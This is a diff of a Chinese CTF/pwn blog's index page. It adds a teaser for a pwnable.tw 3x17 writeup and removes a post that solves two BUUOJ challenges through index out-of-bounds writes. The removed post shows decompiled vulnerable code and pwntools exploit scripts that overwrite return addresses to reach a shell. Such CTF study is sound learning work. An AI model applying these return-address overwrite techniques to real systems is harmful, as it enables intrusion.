@@ -183,6 +183,90 @@
   
   
    <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/12/writeup-3x17/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar_1.jpg">
+      <meta itemprop="name" content="Qwen">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Qwen's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/07/12/writeup-3x17/" class="post-title-link" itemprop="url">pwnable.tw writeup-3x17</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-07-12 22:25:56" itemprop="dateCreated datePublished" datetime="2024-07-12T22:25:56+08:00">2024-07-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-03-14 00:33:39" itemprop="dateModified" datetime="2025-03-14T00:33:39+08:00">2025-03-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwnable-tw%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">pwnable.tw刷题</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="学习与收获"><a href="#学习与收获" class="headerlink" title="学习与收获"></a>学习与收获</h3><ol>
+<li><p><code>ida</code>中，交叉引用<code>X</code>，对函数进行重命名<code>N</code>。</p>
+</li>
+<li><p>程序最开始执行的是<code>start</code>函数，<code>start</code>调用<code>__libc_start_main</code>函数，然后程序执行<code>__libc_csu_init</code>函数，接着才执行<code>main</code>函数，最后执行<code>__libc_csu_fini</code>函数。<code>__libc_start_main</code>的函数原型是<code>__libc_start_main(main,argc,ubp_av,init,fini,rtld_fini)</code>。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/07/12/writeup-3x17/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/11/BUU%E5%88%B7%E9%A2%98/hitcontraining_heapcreator/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -911,122 +995,6 @@
   
   
 
-      
-  
-  
-   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/02/19/%E4%B8%A4%E9%81%93%E6%9C%89%E5%85%B3%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E7%9A%84%E4%BE%8B%E9%A2%98/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar_1.jpg">
-      <meta itemprop="name" content="Qwen">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Qwen's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/02/19/%E4%B8%A4%E9%81%93%E6%9C%89%E5%85%B3%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E7%9A%84%E4%BE%8B%E9%A2%98/" class="post-title-link" itemprop="url">两道有关索引越界的例题</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2024-02-19 20:09:32" itemprop="dateCreated datePublished" datetime="2024-02-19T20:09:32+08:00">2024-02-19</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-03-25 20:13:46" itemprop="dateModified" datetime="2025-03-25T20:13:46+08:00">2025-03-25</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">pwn学习总结</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="wustctf2020-name-your-cat"><a href="#wustctf2020-name-your-cat" class="headerlink" title="wustctf2020_name_your_cat"></a><code>wustctf2020_name_your_cat</code></h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>​	检查保护，<code>32</code>位程序，开了<code>NX</code>和<code>canary</code>保护</p>
-<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011271.png" alt="image-20240219185444801" style="zoom:67%;" />
-
-<p>​	分析源码，程序有后门函数，整体思路就是两次输入分别写进两个地址，这个过程循环<code>5</code>次，然后跳出主函数。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">NameWhich</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2[<span class="number">4</span>]; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2[<span class="number">1</span>] = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Name for which?\n&gt;&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give your name plz: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%7s&quot;</span>, <span class="number">8</span> * v2[<span class="number">0</span>] + a1);</span><br><span class="line">  <span class="keyword">return</span> v2[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">vulnerable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-3Ch]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+10h] [ebp-38h]</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">40</span>]; <span class="comment">// [esp+14h] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I bought you five famale cats.Name for them?&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = NameWhich((<span class="type">int</span>)v3);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You get %d cat!!!!!!\nlemonlemonlemonlemonlemonlemonlemon5555555\n&quot;</span>, i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Her name is:%s\n\n&quot;</span>, &amp;v3[<span class="number">8</span> * v2]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>​	我们分析漏洞函数<code>NameWhich</code>，<code>v2</code>是一个数组，第一次输入，我们是从<code>v2</code>的起始地址（即<code>v2[0]</code>）开始写，第二次输入被写到<code>8*v2[0]+a1</code>这个地址。我们就可以通过第一次输入的内容控制第二次输入被写的地址距离<code>a1</code>的起始地址的偏移。</p>
-<p>​	返回地址距离<code>a1</code>的起始地址的偏移为<code>0x34+4=56</code>个字节，也就是说第一次输入<code>7</code>，第二次输入就可以覆盖返回地址。</p>
-<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011573.png" alt="image-20240219192825555" style="zoom:80%;" />
-
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./name&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28394</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Name for which?\n&gt;&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Give your name plz: &quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Name for which?\n&gt;&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Give your name plz: &quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Name for which?\n&gt;&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Give your name plz: &quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Name for which?\n&gt;&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Give your name plz: &quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shell_addr = <span class="number">0x080485cb</span></span><br><span class="line">payload = p32(shell_addr)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Name for which?\n&gt;&quot;</span>,<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Give your name plz: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>拿到<code>flag</code></p>
-<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011731.png" alt="image-20240219194037922" style="zoom: 67%;" />
-
-<h1 id="qctf2018-stack2"><a href="#qctf2018-stack2" class="headerlink" title="qctf2018_stack2"></a><code>qctf2018_stack2</code></h1><h2 id="学习与收获"><a href="#学习与收获" class="headerlink" title="学习与收获"></a>学习与收获</h2><p>通过本题的学习与收获有：</p>
-<ol>
-<li>在<code>ida</code>中计算的偏移量有时候会有错误，如果在思路正确啥的都正确的时候还打不通，并且找不到错误在哪儿，一定要在<code>gdb</code>中重新算一下偏移量。</li>
-</ol>
-<h2 id="保护-源码"><a href="#保护-源码" class="headerlink" title="保护&amp;源码"></a>保护&amp;源码</h2><p>保护：</p>
-<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011873.png" alt="image-20240307161634907" style="zoom:80%;" />
-
-<p>源码：</p>
-<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011674.png" alt="image-20240307161947166" style="zoom:67%;" />
-
-<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011001.png" alt="image-20240307162150734" style="zoom:80%;" />
-
-<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>​	程序中有后门函数，代码比较长，不过我们仔细分析一下就能找到漏洞点，下图这里，一个索引越界的漏洞。我们可以控制<code>v5</code>为<code>v13</code>起始地址距离装返回地址的地址的偏移量，控制<code>v7</code>为后门函数地址，便可覆盖返回地址为后门函数地址。</p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011439.png" alt="image-20240307162715000"></p>
-<p>​	接下来我们需要确定偏移量。一开始我是在<code>ida</code>中计算的偏移量，这个<code>var_70</code>就是<code>v13</code>，偏移量为<code>0x74</code>。不过本题在<code>ida</code>看的偏移量是错误的，我们需要动态调试一下。</p>
-<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011193.png" alt="image-20240307163736180" style="zoom:80%;" />
-
-<p>下图中，<code>0xffffd010</code>是<code>v7</code>的起始地址</p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252010737.png" alt="image-20240307164308647"></p>
-<p>下图中，<code>0xffffd0ac</code>是装<code>main</code>函数返回地址的栈地址</p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252010240.png" alt="image-20240307164417694"></p>
-<p>​	<code>v7</code>到<code>esp</code>的偏移为<code>0x9c</code>，<code>v7</code>距离<code>v13</code>的偏移为<code>0x88-0x70 = 0x18</code>，故<code>v13</code>距离<code>esp</code>的偏移为<code>0x9c-0x18 = 0x84</code>。</p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252010731.png" alt="image-20240307164926323"></p>
-<p>​	最后还有一个地方也是我一开始没有注意到的，<code>v13[]</code>是<code>char</code>类型的，我们一次只能往地址里写一个字符也就是一个字节，后门函数地址<code>0x0804859b</code>有<code>4</code>个字节，所以我们要分<code>4</code>次写入。</p>
-<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./stack2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26404</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"><span class="comment">#p.recvuntil(b&#x27;5. exit\n&#x27;)</span></span><br><span class="line">backdoor_addr = [<span class="number">0x9b</span>,<span class="number">0x85</span>,<span class="number">0x04</span>,<span class="number">0x08</span>]</span><br><span class="line">offset = <span class="number">0x84</span></span><br><span class="line"><span class="comment">#p.sendline(3)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;5. exit&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;change:&quot;</span>,<span class="built_in">str</span>(offset+i))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;new number:&quot;</span>,<span class="built_in">str</span>(backdoor_addr[i]))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;5. exit&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>拿到<code>flag</code></p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252009547.png" alt="image-20240310143745724"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1106,7 +1074,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">48</span>
+          <span class="site-state-item-count">49</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
